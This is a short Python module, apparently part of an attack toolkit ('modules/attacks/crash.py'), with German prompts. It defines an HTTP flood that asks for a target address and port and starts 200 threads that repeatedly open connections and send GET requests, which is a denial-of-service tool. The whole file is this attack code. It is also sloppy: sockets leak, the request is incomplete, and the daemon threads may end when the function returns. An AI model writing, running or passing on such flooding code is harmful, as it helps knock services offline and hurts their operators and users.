# modules/attacks/crash.py
import socket
import threading

def http_flood():
    target = input("🎯 Ziel-IP/Domain: ")
    port = int(input("🔌 Port (80/443): "))
    threads = 200  # Anpassbar je nach eigener Bandbreite

    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode(), (target, port))
                print(f"💣 Paket an {target} gesendet")
            except:
                s.close()

    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
